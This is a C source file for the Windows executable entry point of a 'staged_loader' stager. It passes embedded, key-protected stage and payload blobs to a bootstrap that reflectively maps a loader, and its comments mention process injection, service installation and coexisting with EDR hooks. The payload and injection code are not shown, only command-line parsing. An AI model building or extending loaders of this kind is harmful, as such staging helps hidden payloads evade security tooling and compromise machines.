/*
 * staged_loader stager host (Windows exe).
 *
 * The on-disk executable embeds the packed artifacts via stage_data.S (see
 * stage_data.h). It hands them, plus its own command line, to the shared
 * staged_loader_bootstrap(), which reflectively maps the real loader and calls
 * its StageMain. All behaviour (service dispatch, CLI, injection) lives in
 * the stage, so this file is only the exe entry point.
 *
 * Built as `service` it includes the service dispatcher/install commands;
 * built as `exe` (STAGED_LOADER_NO_SERVICE) it is a plain one-shot launcher.
 */
#ifndef STAGER_UNIT_TEST
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>

#include "bootstrap.h"
#include "stage_data.h"
#else
#include <stddef.h>
#include <wchar.h>
#endif

#ifndef STAGER_MAX_ARGS
#define STAGER_MAX_ARGS 64
#endif
#ifndef STAGER_ARGV_CHARS
#define STAGER_ARGV_CHARS 32768
#endif

static wchar_t *g_stager_argv[STAGER_MAX_ARGS];
static wchar_t g_stager_argv_buf[STAGER_ARGV_CHARS];

/*
 * split_command_line tokenizes GetCommandLineW() without shell32. The narrow
 * CRT entry point never fills __wargv, and CommandLineToArgvW can deadlock
 * when an EDR hook DLL is loaded, so the stager parses the wide command line
 * itself. Quotes group a token and are removed; a backslash is literal.
 */
static int split_command_line(wchar_t *line, wchar_t **argv, int max) {
  wchar_t *src = line;
  wchar_t *dst = g_stager_argv_buf;
  wchar_t *end = g_stager_argv_buf + STAGER_ARGV_CHARS - 1;
  int argc = 0;

  if (line == NULL || argv == NULL || max <= 0) {
    return 0;
  }

  while (*src != L'\0') {
    int quoted = 0;

    while (*src == L' ' || *src == L'\t') {
      src++;
    }
    if (*src == L'\0' || argc >= max || dst >= end) {
      break;
    }
    argv[argc++] = dst;
    while (*src != L'\0') {
      wchar_t c = *src++;
      if (c == L'"') {
        quoted = !quoted;
        continue;
      }
      if (!quoted && (c == L' ' || c == L'\t')) {
        break;
      }
      if (dst >= end) {
        *dst = L'\0';
        return argc;
      }
      *dst++ = c;
    }
    *dst++ = L'\0';
  }
  return argc;
}

#ifndef STAGER_UNIT_TEST
int main(void) {
  wchar_t *line;
  int argc;
  int ret;

  line = GetCommandLineW();
  if (line == NULL) {
    return 1;
  }
  argc = split_command_line(line, g_stager_argv, STAGER_MAX_ARGS);
  if (argc <= 0) {
    return 1;
  }

  ret = staged_loader_bootstrap(
      staged_loader_stage_start,
      (size_t)(staged_loader_stage_end - staged_loader_stage_start),
      staged_loader_stage_key_start,
      (size_t)(staged_loader_stage_key_end - staged_loader_stage_key_start),
      staged_loader_payload_start,
      (size_t)(staged_loader_payload_end - staged_loader_payload_start),
      staged_loader_key_start,
      (size_t)(staged_loader_key_end - staged_loader_key_start), argc,
      g_stager_argv);

  return ret;
}
#endif
